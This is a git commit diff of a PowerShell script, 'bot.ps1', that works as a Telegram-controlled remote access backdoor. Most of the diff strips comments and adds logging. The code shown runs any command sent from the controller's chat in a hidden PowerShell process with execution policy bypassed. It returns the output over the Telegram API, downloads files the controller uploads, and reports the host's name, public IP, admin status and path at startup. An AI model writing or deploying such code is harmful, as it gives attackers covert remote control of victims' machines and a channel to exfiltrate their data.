b17182bbf83c2ae3bd9c7a6ea217902391557dc8
FebVeg <feb19958@gmail.com>
2022-07-19 15:19:59 +0200

    Script Updated

--- bot.ps1
+++ bot.ps1
@@ -25,8 +25,7 @@ function splitOutput ($output)
 # Divide the characters and create blocks of 4096 letters.
 # The return of the function is an array.
 {
-    if ($output.Length -gt 4096)    # If the output incoming string is greater than 4096 chars
-    {
+    if ($output.Length -gt 4096) {
         Write-Host "Separation for every 4096 characters of the input output..."
     }
 
@@ -37,26 +36,24 @@ function splitOutput ($output)
 
     Write-Host "Working on it..."
 
-    foreach ($char in $output_splitted)                     # For every character inside the incoming output
-    {
-        if ($counter -eq 4096)                              # If the counter used to verify the cycle has exceeded 4096 times the job
-        {
+    foreach ($char in $output_splitted) {
+        if ($counter -eq 4096) {
             Write-Host "Creating a block..."
-            $array_of_output_parts += $temp_part_of_output  # Pass to the array the block
+            $array_of_output_parts += $temp_part_of_output
             Write-Host "Block created..."
-            $temp_part_of_output = ""                       # Clears the temporary variable used to insert the selected characters
-            $counter = 0                                    # Set the counter to 0
+            $temp_part_of_output = ""
+            $counter = 0
         }
 
-        $temp_part_of_output += $char                       # Pass into the temporary variable the character
+        $temp_part_of_output += $char
         $counter += 1
     }
     
     Write-Host "Create the last block..."
-    $array_of_output_parts += $temp_part_of_output          # Add to the array the last block not handled because not greater than 4096 chars
+    $array_of_output_parts += $temp_part_of_output
     
     Write-Host "The output is ready to be sent"
-    return $array_of_output_parts                           # return a string object
+    return $array_of_output_parts
 }
 
 
@@ -77,15 +74,19 @@ function downloadDocument ($file_id, $file_name)
 # The "downloadDocument" function takes as parameters the file_id and the file_name of the document uploaded to Telegram by the controller of the Bot. 
 # Send a Get request to the Telegram API to download the file.
 {
-    sendMessage "Getting information about document..."
-    $get_file_path = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id)
-    sendMessage "File path received"
-    $file_path = $get_file_path.result.file_path
-    sendMessage "Downloading file..."
+    Write-Host "Getting the informations about this document..."
+    $get_file_path  = Invoke-RestMethod -Method Get -Uri ($api_get_file + $file_id)
+    $file_path      = $get_file_path.result.file_path
+
+    Write-Host "The file information was found, downloading it..."
     Invoke-RestMethod -Method Get -Uri ($api_download_file + $file_path) -OutFile $file_name
+    
+    Write-Host "Checking the file..."
     if (Test-Path -Path $file_name) {
+        Write-Host "Downloaded"
         sendMessage "Downloaded"
     } else {
+        Write-Host "File was not downloaded"
         sendMessage "File was not downloaded"
     }
 }
@@ -131,9 +132,8 @@ function sendMessage ($output, $message_id)
         Invoke-RestMethod -Method Post -Uri $api_get_messages -Body $MessageToSend -ContentType "application/json" | Out-Null   # Send an HTTPS POST request
         Write-Host "The message has been successfully sent"
     } catch {
-        Write-Host -ForegroundColor RED -BackgroundColor Black $Error[0]    # Its just for debug 
-        $wait = $wait + 100                                                 # Increase by 100ms the wait timer
-        Start-Sleep -Milliseconds $wait                                     # Waiting $wait seconds
+        Write-Host -ForegroundColor RED -BackgroundColor Black $Error[0]
+        Start-Sleep -Seconds 3
     }
 }
 
@@ -144,85 +144,111 @@ function commandListener
 # Once the command is executed, the result of the command will then be sent as a reply to the message to the controller of the Bot.
 # Attention! There is a timer that will be incremented to 100ms at a time to limit HTTPS requests to the Telegram API.
 {
-    if (-Not(Test-Path -Path $cache_file))                                              # If the cache file doesn't exists creating it
-    {
-        Add-Content -Path $cache_file -Value "0" -Force                                 # Add a '0' to the cache file
+    if (-Not(Test-Path -Path $cache_file)) {
+        Write-Host "Create a cache file..."
+        Add-Content -Path $cache_file -Value "0" -Force
     }
 
     try 
     {
-        while (Invoke-RestMethod -Method Get "api.telegram.org")                        # As long as the telegram url is reachable
-        {
+        Write-Host "Listening for commands..."
+        while (Invoke-RestMethod -Method Get "api.telegram.org") {
+            Write-Host "Checking the last text message from the telegram chat..."
             $message    = Invoke-RestMethod -Method Get -Uri $api_get_updates           # Get the JSON response about the telegram updates
             $message    = $message.result.Message[-1]                                   # Get the last JSON record
             $message_id = $message.message_id                                           # Get the message_id of the update
             $user_id    = $message.chat.id                                              # Get the ID about the sender message
             $text       = $message.text                                                 # Get the text message (it will be the command that you want to execute)
             $document   = $message.document                                             # If there is a document value inside the JSON record save it to this variable
-
-            if ((Get-Content -Path $cache_file)[-1] -notmatch $message_id)              # Check if the last record of the cache file is not the message_id (this prevent multi-executions)
+            
+            $recovered_data = 'Data recovered from the GET request: {0}, {1}, {2}, {3}, {4}' -f $message, $message_id, $user_id, $text, $document
+            Write-Host $recovered_data
+            
+            Write-Host "Check for a new incoming command..."
+            if ((Get-Content -Path $cache_file)[-1] -notmatch $message_id)
             {
-                Write-Host ($tID + " of the verified message: " + $message_id)
-                Add-Content -Path $cache_file -Value $message_id -Force                 # Put in the cache file the message_id for saving it
-                if ($user_id -match $tID)                                       # Check if the sender ID is your Telegram ID
+                Write-Host "A new command has been discovered! [$text]"
+
+                Write-Host "Saving the message_id [$message_id] to the cache file..."
+                Add-Content -Path $cache_file -Value $message_id -Force
+                
+                Write-Host "Checking for the validation of the user ID..."
+                if ($user_id -match $tID)
                 {
-                    Write-Host ("Username verified: " + $username)
-                    if ($text -match "exit")                                            # If the message is "exit" than close the powershell session
+                    Write-Host "User ID has been verified [$user_id]"
+                    if ($text -match "exit")
                     {
                         Write-Host "Connection closure..."
                         exit
                     }
-
-                    if (Test-Path -Path $text)                                          # If the message is a filepath then send the document to telegram
-                    {
-                        sendDocument $text                                              # Send the document
-                    } 
-                    elseif ($text.Length -gt 0)                                         # If the length of message is greater 0 then execute it
+                    
+                    Write-Host "Checking the length of the command..."
+                    if ($text.Length -gt 0)
                     {
                         try {
+                            Write-Host "Executing it..."
                             $output = Powershell.exe -ep Bypass -WindowStyle Hidden -Command $text
+                            Write-Host "Converting the output captured to a String..."
                             $output = $output | Out-String
                         } catch {
-                            $output = $Error[0] | Out-String                            # If the command returns error save it as a string
+                            $err = $Error[0]
+                            Write-Host "ERROR DURING THE EXECUTION OF THE INSTRUCTIONS"
+                            Write-Host "Converting the error message to a String..."
+                            $output = $err | Out-String
                         }
                         
-                        $output = splitOutput $output                                   # Create an output container for more than 4096 characters
+                        Write-Host "Sends the captured output to the split function..."
+                        $output = splitOutput $output
                         
-                        foreach ($block in $output)                                     # For each block of 4096 characters, send them to telegram as a message
+                        Write-Host "Send to Telegram all blocks returned from the split function..."
+                        foreach ($block in $output)
                         {
+                            Write-Host "Converting to string the splitted block..."
                             $block = $block | Out-String
-                            if ($block.Length -gt 2)                                    # If a block is greater 2 send it 
+
+                            Write-Host "Checking if the block size is major than 2..."
+                            if ($block.Length -gt 2)
                             {
-                                sendMessage $block $message_id                          # Send a block as an answer for the incoming text message
+                                Write-Host "Send the data to the message sending function..."
+                                sendMessage $block $message_id
                             } 
                             else {
-                                sendMessage "No Output Data" $message_id                # If the block is 2 about length answer it 
+                                Write-Host "Send the data to the message sending function..."
+                                sendMessage "No Output Data" $message_id
                             }
                         }
-                        
-                        $wait = 1000                                                    # Set a sleep timer to 1000
+
+                        Write-Host "Set the timer to 1000ms"
+                        $wait = 1000
                     }
                     
-                    if ($document)                                                      # If there is a document in the message download it
-                    {
-                        $file_id   = $document.file_id                                  # Get the file_id of the document
-                        $file_name = $document.$file_name                               # Get the file_name of the document
-                        downloadDocument $file_id $file_name                            # Download this document
+                    if ($document) {
+                        Write-Host "Getting the informations about the file..."
+                        $file_id   = $document.file_id
+                        $file_name = $document.$file_name
+                        
+                        Write-Host "File informations: [$file_id] [$file_name]"
+
+                        Write-Host "Send these informations to the download file function..."
+                        downloadDocument $file_id $file_name
                     }
                 } 
                 else {
-                    sendMessage ("Unauthorized user found! " + $user_id)                # If an unauthorized user try to use bot then alert the controller
+                    $unauth_user_found = ("Unauthorized user found! " + $user_id)
+                    Write-Host $unauth_user_found
+                    sendMessage $unauth_user_found
                 }
             }
 
-            if ($wait -eq 15000)                                                        # If the waiting timer is 15000ms then restore ti 1000
-            {
-                $wait = 1000                                                            # Restore the timer to 1000ms
-            } else {                                                                    # If timer is not 15000ms then increase it by 100ms
-                $wait = $wait + 100                                                     # Increase the sleep timer by 100ms
+            if ($wait -eq 15000) {
+                Write-Host "The timer has reached the maximum of its default value, I reset it to 1000ms..."
+                $wait = 1000
+            } else {
+                $wait = $wait + 100
             }
-
-            Start-Sleep -Milliseconds $wait                                             # Sleep timer
+            
+            Write-Host "Wait [$wait]ms..."
+            Start-Sleep -Milliseconds $wait
         }
     } 
     catch {
@@ -236,22 +262,23 @@ function commandListener
                 Start-Sleep -Milliseconds 5
             }
         }
-
-        commandListener                                                                 # Once the connection will be restored reset the listener
+        Write-Host "Restart the listener..."
+        commandListener
     }
 }
 
 
 try {
     if ((tnc).PingSucceeded) {
-        Write-Host "Sending the connected message to Telegram..."
+        Write-Host "Alert the Bot owner that the listener has been started!"
+        Write-Host "Recovering initial informations..."
         $_ip    = (Invoke-WebRequest -Uri "https://ident.me/").Content                  # Get the Public IP from the ISP
         $_path  = (Get-Location).Path                                                   # Get the current location of the Bot
         $_user  = checkAdminRights                                                      # Get the boolean value to check if the user is an administrator or not
         $_host  = $env:COMPUTERNAME                                                     # Get the current Hostname or the name of the machine
         $_body  = '{0} ({1}) - IP: {2} - [{3}]' -f $_host, $_user, $_ip, $_path         # Build everything...
         sendMessage $_body                                                              # Send a message with the body 
-        Write-Host "Message sent"
+        Write-Host "Alert sent"
     }
 }
 catch {
